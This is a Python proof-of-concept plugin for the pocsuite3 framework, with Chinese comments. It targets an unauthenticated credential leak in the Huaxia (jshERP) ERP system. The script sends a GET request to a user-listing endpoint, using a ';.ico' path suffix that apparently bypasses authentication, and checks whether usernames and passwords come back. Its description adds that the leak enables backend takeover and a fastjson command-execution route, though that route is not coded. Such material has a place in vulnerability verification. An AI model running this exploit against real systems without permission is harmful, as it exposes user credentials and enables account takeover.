from collections import OrderedDict
import urllib.parse
import re,random
from requests_toolbelt.multipart.encoder import MultipartEncoder
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict, OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
from requests.api import patch

class POC(POCBase):
    vulID = '0'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'  #默认为1
    author = ['']  #  PoC作者的大名
    vulDate = '20230613'  #漏洞公开的时间,不知道就写今天
    createDate = '20230613'  # 编写 PoC 的日期
    updateDate = '20230613'  # PoC 更新的时间,默认和编写时间一样
    references = ['']  # 漏洞地址来源,0day不用写
    name = ''  # PoC 名称
    appPowerLink = 'https://www.legendsec.com'  # 漏洞厂商主页地址
    appName = '华夏erp账号密码泄露'  # 漏洞应用名称
    appVersion = '''ALL'''  # 漏洞影响版本
    vulType = VUL_TYPE.INFORMATION_DISCLOSURE  #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        华夏ERP前台泄露了某api接口，恶意攻击者可通过调用该接口，对用户的账号和密码进行非授权访问，在获取到账号和密码后，恶意攻击者可接管后台。且后台的pom.xml文件引入了fastjson框架。攻击者可通过指定api接口，实现后台远程命令执行。
    '''

  # 漏洞简要描述
    samples = ['']  # 测试样列,就是用 PoC 测试成功的网站
    install_requires = ['']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    
    
    def _verify(self):
        result = {}
        path = "/jshERP-boot/user/getAllList;.ico"
        url = self.url + path
        headers = {
                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, likeGecko) Chrome/101.0.4951.64 Safari/537.36",

        }
        try:
            resp = requests.get(url=url, headers=headers, verify=False, timeout=10)
            if resp.status_code == 200 and "username" in resp.text and "password" in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['POC'] = url
        except Exception as e:
            return
        return self.parse_output(result)
    
    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    
register_poc(POC)